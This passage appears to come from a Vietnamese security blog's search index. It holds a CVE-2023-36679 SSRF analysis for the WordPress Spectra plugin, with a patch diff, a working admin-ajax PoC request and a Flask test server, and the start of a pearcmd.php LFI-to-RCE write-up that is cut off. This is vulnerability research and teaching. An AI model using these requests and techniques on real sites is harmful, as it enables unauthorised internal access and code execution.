Plugin.","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Server Side Request Forgery (SSRF) ƒë√£ ƒë∆∞·ª£c ph√°t hi·ªán trong plugin WordPress Spectra (tr∆∞·ªõc ƒë√¢y g·ªçi l√† Ultimate Addons cho Gutenberg) ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n l√™n t·ªõi 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) v√† 2.6.7 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } Trong phi√™n b·∫£n 2.6.6, h√†m template_importer() nh·∫≠n tham s·ªë api_uri tr·ª±c ti·∫øp t·ª´ bi·∫øn $_REQUEST v√† s·ª≠ d·ª•ng gi√° tr·ªã n√†y ƒë·ªÉ g·ª≠i HTTP request th√¥ng qua h√†m wp_remote_get(): Do kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c ho·∫∑c gi·ªõi h·∫°n ngu·ªìn, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt URL t√πy √Ω ƒë·ªÉ √©p m√°y ch·ªß th·ª±c hi·ªán request ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô. ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng Server-Side Request Forgery (SSRF). B·∫£n v√°: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } B·∫£n v√° ƒë√£ lo·∫°i b·ªè vi·ªác nh·∫≠n URL tr·ª±c ti·∫øp t·ª´ ng∆∞·ªùi d√πng. Thay v√†o ƒë√≥, m√£ ch·ªâ nh·∫≠n ID c·ªßa block th√¥ng qua $_REQUEST['id'] v√† truy xu·∫•t URL t∆∞∆°ng ·ª©ng t·ª´ c∆° s·ªü d·ªØ li·ªáu (wp_options) b·∫±ng kh√≥a ast-block-templates_data-{id}: Nh·ªù ƒë√≥, URL ƒë∆∞·ª£c gi·ªõi h·∫°n trong c√°c b·∫£n ghi ƒë∆∞·ª£c qu·∫£n l√Ω s·∫µn trong h·ªá th·ªëng, lo·∫°i b·ªè kh·∫£ nƒÉng ng∆∞·ªùi d√πng t·ª± cung c·∫•p ƒë∆∞·ªùng d·∫´n t√πy √Ω. C∆° ch·∫ø n√†y gi√∫p ngƒÉn ch·∫∑n ho√†n to√†n nguy c∆° SSRF v√† tƒÉng t√≠nh an to√†n khi g·ªçi API t·ª´ ph√≠a m√°y ch·ªß. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rtemplate_importer() y√™u c·∫ßu ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn t·ª´ Contributor tr·ªü l√™n if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } X√°c th·ª±c nonce ch·ªëng csrf v·ªõi t√™n nonce l√† _ajax_nonce, n·∫øu nonce kh√¥ng kh·ªõp =\u003e tho√°t kh·ªèi logic v√† g·ª≠i l·ªói. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); M·∫πo L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Contributor, n√™n gi√° tr·ªã _ajax_nonce r·∫•t c√≥ kh·∫£ nƒÉng xu·∫•t hi·ªán trong m√£ ngu·ªìn giao di·ªán Admin. V·ªõi c√°c l·ªó h·ªïng li√™n quan t·ªõi quy·ªÅn Contributor th∆∞·ªùng g·∫Øn v·ªõi ch·ª©c nƒÉng t·∫°o b√†i vi·∫øt, b·∫°n c√≥ th·ªÉ t√¨m _ajax_nonce b·∫±ng c√°ch inspect ph·∫ßn t·∫°o/s·ª≠a post trong trang qu·∫£n tr·ªã (ho·∫∑c t√¨m trong script/HTML m√† trang Admin sinh ra). _ajax_nonce trong response\rSau c√°c b∆∞·ªõc x√°c th·ª±c, m√£ l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã api_uri t·ª´ $_REQUEST, g·ªçi esc_url_raw() r·ªìi gh√©p tham s·ªë truy v·∫•n v√† th·ª±c hi·ªán cu·ªôc g·ªçi HTTP b·∫±ng wp_remote_get() $api_uri = isset( $_REQUEST['api_uri'] ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = array( '_fields' =\u003e 'original_content' ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); $response = wp_remote_get( $demo_api_uri, $api_args ); Cu·ªëi c√πng s·∫Ω decode response v√† tr·∫£ v·ªÅ d·∫°ng JSON v·ªõi key original_content $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); template_importer() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook: add_action( 'wp_ajax_ast_block_templates_importer', array( $this, 'template_importer' ) ); T·ª©c, khi truy c·∫≠p endpoint /wp-admin/admin-ajax/php v·ªõi action=ast_block_templates_importer th√¨ template_importer() ƒë∆∞·ª£c g·ªçi. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o post v√† l·∫•y _ajax_nonce G·ª≠i request v·ªõi api_uri tr·ªè ƒë·∫øn local service http://127.0.0.1:8001/test b·∫±ng user Contributor POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, text/javascript, */*; q=0.01 Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35 action=ast_block_templates_importer\u0026_ajax_nonce=3ef4c6d6df\u0026api_uri=http://127.0.0.1:8001/test Result: ƒê·ªçc n·ªôi dung t·ª´ local service\r","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 2.6.6 c·ªßa plugin Spectra (Ultimate Addons for Gutenberg) t·ªìn t·∫°i l·ªó h·ªïng SSRF do s·ª≠ d·ª•ng wp_remote_get() v·ªõi URL do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng gi·ªõi h·∫°n ho·∫∑c x√°c th·ª±c ngu·ªìn. ƒêi·ªÅu n√†y cho ph√©p t√†i kho·∫£n c√≥ quy·ªÅn Contributor g·ª≠i request t·ª´ m√°y ch·ªß WordPress ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng tin t∆∞·ªüng URL t·ª´ client, ch·ªâ d√πng d·ªØ li·ªáu c√≥ s·∫µn tr√™n server. ∆Øu ti√™n d√πng wp_safe_remote_get() thay cho wp_remote_get(). Ki·ªÉm tra ph·∫£n h·ªìi HTTP (status, MIME, n·ªôi dung). Gi·ªõi h·∫°n quy·ªÅn g·ªçi request ch·ªâ cho vai tr√≤ c·∫ßn thi·∫øt. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Spectra Plugin \u003c= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analysis"],"collections":null,"content":"Xin ch√†o. Sau khi ph√¢n t√≠ch 10 CVE li√™n quan ƒë·∫øn LFI tr√™n c√°c plugin WordPress, t√¥i nh·∫≠n th·∫•y m·ªôt r√†o c·∫£n chung: nhi·ªÅu vector khai th√°c b·ªã gi·ªõi h·∫°n b·ªüi y√™u c·∫ßu ph·∫£i c√≥ h·∫≠u t·ªë .php. ƒêi·ªÅu n√†y l√†m gi·∫£m ƒë√°ng k·ªÉ kh·∫£ nƒÉng khai th√°c. Trong qu√° tr√¨nh t√¨m hi·ªÉu, t√¥i t√¨m th·∫•y b√†i vi·∫øt docker-php-include-getshell. B√†i ƒë√≥ m√¥ t·∫£ c√°ch bypass r√†ng bu·ªôc .php b·∫±ng c√°ch l·ª£i d·ª•ng file pearcmd.php v·ªën n·∫±m trong b·ªô c√¥ng c·ª• PECL/PEAR c·ªßa PHP v√† c√≥ s·∫µn trong m√¥i tr∆∞·ªùng WordPress ƒë∆∞·ª£c tri·ªÉn khai tr√™n Docker - m·ªôt m·∫πo r·∫•t th·ª±c t·∫ø cho k·ªãch b·∫£n kh√¥ng cho upload file. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#"},{"categories":["CVE Analysis"],"collections":null,"content":"PEAR v√† PECL l√† g√¨?\rPECL (PHP Extension Community Library): c√¥ng c·ª• d√≤ng l·ªánh ƒë·ªÉ c√†i v√† qu·∫£n l√Ω extension PHP. PEAR (PHP Extension and Application Repository): th∆∞ vi·ªán n·ªÅn t·∫£ng cho PECL. Tr∆∞·ªõc PHP 7.3, PEAR/PECL th∆∞·ªùng ƒë∆∞·ª£c c√†i m·∫∑c ƒë·ªãnh. T·ª´ PHP 7.4 tr·ªü ƒëi, c·∫ßn bi√™n d·ªãch PHP v·ªõi --with-pear ƒë·ªÉ c√≥ ch√∫ng. Tuy nhi√™n, trong c√°c Docker image PHP ch√≠nh th·ª©c, PEAR/PECL v·∫´n th∆∞·ªùng ƒë∆∞·ª£c c√†i s·∫µn, n·∫±m ·ªü /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:1:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pear-v√†-pecl-l√†-g√¨"},{"categories":["CVE Analysis"],"collections":null,"content":"pearcmd.php v√† register_argc_argv\rpearcmd.php l√† m·ªôt script PHP thi·∫øt k·∫ø ƒë·ªÉ ch·∫°y ·ªü ch·∫ø ƒë·ªô d√≤ng l·ªánh, v√≠ d·ª•: php /usr/local/lib/php/pearcmd.php install somepackage N√≥ x·ª≠ l√Ω c√°c tham s·ªë t·ª´ $argv v√† $argc. Khi ch·∫°y nh∆∞ CLI th√¨ d·ªØ li·ªáu n√†y r√µ r√†ng. N·∫øu file n√†y ƒë∆∞·ª£c include trong b·ªëi c·∫£nh web (do LFI), logic CLI c·ªßa n√≥ c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng. ƒêi·ªÉm then ch·ªët l√† c·∫•u h√¨nh register_argc_argv. N·∫øu register_argc_argv = On, PHP s·∫Ω t·∫°o: $argc $argv $_SERVER['argv'] `argv` trong c·∫•u h√¨nh PHP\rKhi thi·∫øt l·∫≠p WordPress tr√™n Docker, register_argc_argv th∆∞·ªùng b·∫≠t m·∫∑c ƒë·ªãnh. V·∫•n ƒë·ªÅ ƒë·∫∑t ra: khi PHP ch·∫°y d∆∞·ªõi SAPI web (FPM/Apache) v√† kh√¥ng ph·∫£i CLI, $argv l·∫•y d·ªØ li·ªáu t·ª´ ƒë√¢u? ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:2:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmdphp-v√†-register_argc_argv"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis PHP Source Code\rTrong PHP core c√≥ logic nh∆∞ sau: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } N·∫øu kh√¥ng c√≥ argc (kh√¥ng ch·∫°y CLI), PHP g·ªçi php_build_argv v·ªõi SG(request_info).query_string - t·ª©c query string c·ªßa URL. V√≠ d·ª•: http://example.com/index.php?a=b\u0026c=d ‚Üí query_string = \"a=b\u0026c=d\" PHP s·∫Ω d√πng query string n√†y ƒë·ªÉ t·∫°o bi·∫øn argv, do ƒë√≥ $_SERVER['argv'] c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng b·ªüi query string. H·∫≠u qu·∫£: Khi pearcmd.php ƒë∆∞·ª£c include qua LFI trong m√¥i tr∆∞·ªùng web m√† $_SERVER['argv'] ƒë∆∞·ª£c sinh t·ª´ query string, attacker c√≥ th·ªÉ ƒëi·ªÅu khi·ªÉn c√°c tham s·ªë d√≤ng l·ªánh m√† pearcmd.php ƒë·ªçc ƒë∆∞·ª£c. Do ƒë√≥, ch·ª©c nƒÉng d√≤ng l·ªánh c·ªßa PEAR/PECL c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng qua web ƒë·ªÉ th·ª±c hi·ªán h√†nh ƒë·ªông kh√¥ng mong mu·ªën. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:3:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#analysis-php-source-code"},{"categories":["CVE Analysis"],"collections":null,"content":"RFC3875 Explain\rRFC3875 (CGI spec) ƒë·ªãnh nghƒ©a m·ªôt d·∫°ng ‚Äúindexed‚Äù HTTP query - t·ª©c l√† chu·ªói truy v·∫•n kh√¥ng ch·ª©a d·∫•u = ch∆∞a m√£ h√≥a v√† ƒë∆∞·ª£c g·ª≠i qua ph∆∞∆°ng th·ª©c GET ho·∫∑c HEAD. Khi g·∫∑p lo·∫°i truy v·∫•n n√†y, server n√™n (SHOULD) coi ph·∫ßn query-string nh∆∞ m·ªôt search-string, t√°ch th√†nh c√°c search-word b·∫±ng d·∫•u +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar Sau khi t√°ch, m·ªói search-word s·∫Ω ƒë∆∞·ª£c URL-decode, c√≥ th·ªÉ m√£ h√≥a l·∫°i theo h·ªá th·ªëng, r·ªìi th√™m v√†o danh s√°ch ƒë·ªëi s·ªë d√≤ng l·ªánh (argv) c·ªßa ch∆∞∆°ng tr√¨nh CGI. N√≥i ng·∫Øn g·ªçn: n·∫øu query-string kh√¥ng c√≥ d·∫•u = v√† l√† y√™u c·∫ßu GET ho·∫∑c HEAD, m√°y ch·ªß c√≥ th·ªÉ coi c√°c ph·∫ßn ngƒÉn c√°ch b·∫±ng + nh∆∞ c√°c tham s·ªë d√≤ng l·ªánh v√† truy·ªÅn v√†o argv. RFC3875 cho ph√©p server bi·∫øn m·ªôt query-string ‚Äúindexed‚Äù (GET/HEAD, kh√¥ng c√≥ k√Ω t·ª± = ch∆∞a m√£ h√≥a) th√†nh danh s√°ch t·ª´, r·ªìi ƒë∆∞a v√†o argv. Ph·∫ßn m√¥ t·∫£ trong ti√™u chu·∫©n nh∆∞ sau: 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserved = \";\" | \"/\" | \"?\" | \":\" | \"@\" | \"\u0026\" | \"=\" | \",\" | \"$\" After parsing, each search-word is URL-decoded, optionally encoded in a system-defined manner and then added to the command line argument list. PHP t·ª´ng c√≥ l·ªó h·ªïng li√™n quan (CVE-2012-1823). Hi·ªán nay, PHP x·ª≠ l√Ω query-string r·ªông h∆°n RFC - ngay c·∫£ khi query-string c√≥ d·∫•u =, n√≥ v·∫´n c√≥ th·ªÉ ƒë∆∞·ª£c ƒë∆∞a v√†o $_SERVER['argv']. PHP v·∫´n th√™m query-string c√≥ d·∫•u `=` v√†o $_SERVER['argv']\rüëâ Khi truy·ªÅn query string theo d·∫°ng ?a+b+c+..., PHP s·∫Ω t√°ch chu·ªói t·∫°i c√°c d·∫•u + v√† t·∫°o ra bi·∫øn $_SERVER['argv'] d∆∞·ªõi d·∫°ng m·ªôt m·∫£ng ch·ª©a c√°c ph·∫ßn t·ª≠ ['a', 'b', 'c', ...], ƒë√∫ng theo c∆° ch·∫ø ƒë∆∞·ª£c m√¥ t·∫£ trong RFC3875. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:4:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#rfc3875-explain"},{"categories":["CVE Analysis"],"collections":null,"content":"Testing PEAR in CLI\rTrong b√†i vi·∫øt c·ªßa t√°c gi·∫£ c√≥ ƒë·ªÅ c·∫≠p ƒë·∫øn payload li√™n quan ƒë·∫øn config-create, ƒë∆∞·ª£c m√¥ t·∫£ l√† d√πng ƒë·ªÉ t·∫°o file c·∫•u h√¨nh. M√¥ t·∫£ v·ªÅ config-create\rKhi t√¥i th·ª≠ ch·∫°y l·ªánh tr√™n CLI: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create config-create: must have 2 parameters, root path and filename to save as Khi kh√¥ng truy·ªÅn ƒë·ªß tham s·ªë, ch∆∞∆°ng tr√¨nh b√°o l·ªói v√† y√™u c·∫ßu hai tham s·ªë b·∫Øt bu·ªôc: root path: th∆∞ m·ª•c g·ªëc m√† PEAR d√πng ƒë·ªÉ c√†i ƒë·∫∑t c√°c package v√† t√¨m c·∫•u h√¨nh. filename: ƒë∆∞·ªùng d·∫´n t·ªõi file c·∫•u h√¨nh s·∫Ω ƒë∆∞·ª£c t·∫°o ra. Th·ª≠ ch·∫°y v·ªõi tham s·ªë ƒë·∫ßy ƒë·ªß: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php Root directory must be an absolute path beginning with \"/\", was: \"test_root_path\" ·ªû ƒë√¢y PEAR y√™u c·∫ßu test_root_path ph·∫£i l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi, t·ª©c l√† ph·∫£i c√≥ d·∫•u / ·ªü ƒë·∫ßu. Khi ch·∫°y l·∫°i v·ªõi ƒë∆∞·ªùng d·∫´n h·ª£p l·ªá: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php K·∫øt qu·∫£ tr·∫£ v·ªÅ: Configuration (channel pear.php.net): ===================================== Auto-discover new Channels auto_discover \u003cnot set\u003e Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy \u003cnot set\u003e PEAR server [DEPRECATED] master_server \u003cnot set\u003e Default Channel Mirror preferred_mirror \u003cnot set\u003e Remote Configuration File remote_config \u003cnot set\u003e PEAR executables directory bin_dir /test_root_path/pear PEAR documentation directory doc_dir /test_root_path/pear/docs PHP extension directory ext_dir /test_root_path/pear/ext PEAR directory php_dir /test_root_path/pear/php PEAR Installer cache directory cache_dir /test_root_path/pear/cache PEAR configuration file cfg_dir /test_root_path/pear/cfg directory PEAR data directory data_dir /test_root_path/pear/data PEAR Installer download download_dir /test_root_path/pear/download directory Systems manpage files man_dir /test_root_path/pear/man directory PEAR metadata directory metadata_dir \u003cnot set\u003e PHP CLI/CGI binary php_bin \u003cnot set\u003e php.ini location php_ini \u003cnot set\u003e --program-prefix passed to php_prefix \u003cnot set\u003e PHP's ./configure --program-suffix passed to php_suffix \u003cnot set\u003e PHP's ./configure PEAR Installer temp directory temp_dir /test_root_path/pear/temp PEAR test directory test_dir /test_root_path/pear/tests PEAR www files directory www_dir /test_root_path/pear/www Cache TimeToLive cache_ttl \u003cnot set\u003e Preferred Package State preferred_state \u003cnot set\u003e Unix file mask umask \u003cnot set\u003e Debug Log Level verbose \u003cnot set\u003e PEAR password (for password \u003cnot set\u003e maintainers) Signature Handling Program sig_bin \u003cnot set\u003e Signature Key Directory sig_keydir \u003cnot set\u003e Signature Key Id sig_keyid \u003cnot set\u003e Package Signature Type sig_type \u003cnot set\u003e PEAR username (for username \u003cnot set\u003e maintainers) User Configuration File Filename /var/www/html/test_filename.php System Configuration File Filename #no#system#config# Successfully created default configuration file \"/var/www/html/test_filename.php\" K·∫øt qu·∫£ cho th·∫•y c√°c ƒë∆∞·ªùng d·∫´n con cho t·ª´ng lo·∫°i d·ªØ li·ªáu ƒë∆∞·ª£c t·ª± ƒë·ªông sinh ra d∆∞·ªõi /test_root_path/pear. ·ªû d√≤ng cu·ªëi c√πng: Successfully created default configuration file \"/var/www/html/test_filename.php\" File c·∫•u h√¨nh ƒë∆∞·ª£c t·∫°o trong th∆∞ m·ª•c hi·ªán h√†nh, kh√¥ng n·∫±m trong root_path. ƒê√¢y l√† h√†nh vi m·∫∑c ƒë·ªãnh c·ªßa PEAR: root_path ch·ªâ ·∫£nh h∆∞·ªüng ƒë·∫øn c·∫•u tr√∫c th∆∞ m·ª•c c√†i ƒë·∫∑t, kh√¥ng quy·∫øt ƒë·ªãnh v·ªã tr√≠ l∆∞u file c·∫•u h√¨nh. Khi truy c·∫≠p file \"/var/www/html/test_filename.php\" tr√™n tr√¨nh duy·ªát: N·ªôi dung c·ªßa test_filename.php ƒë∆∞·ª£c render tr√™n tr√¨nh duy·ªát\rFile ƒë∆∞·ª£c t·∫°o c√≥ ch·ª©a th√¥ng tin v·ªÅ test_root_path, ƒë∆∞·ª£c tr√¨nh b√†y ·ªü d·∫°ng serialize Tuy nhi√™n, ƒë√≥ m·ªõi ch·ªâ l√† qu√° tr√¨nh th·ª±c thi tr√™n CLI. Trong tr∆∞·ªùng h·ª£p khai th√°c qua web, c·∫ßn ph√¢n t√≠ch m√£ ngu·ªìn ƒë·ªÉ xem c√°ch ch∆∞∆°ng tr√¨nh ti·∫øp nh·∫≠n v√† x·ª≠ l√Ω c√°c tham s·ªë ƒë∆∞·ª£c truy·ªÅn v√†o. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:5:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#testing-pear-in-cli"},{"categories":["CVE Analysis"],"collections":null,"content":"pearcmd Code Analysis\rTr∆∞·ªõc khi ph√¢n t√≠ch m√£ ngu·ªìn c·ªßa /usr/local/lib/php/pearcmd.php, c·∫ßn thi·∫øt l·∫≠p m√¥i tr∆∞·ªùng debug ƒë·ªÉ n·∫Øm r√µ lu·ªìng th·ª±c thi - tham kh·∫£o: https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/ Sau ƒë√≥ h√£y copy to√†n b·ªô m√£ ngu·ªìn php 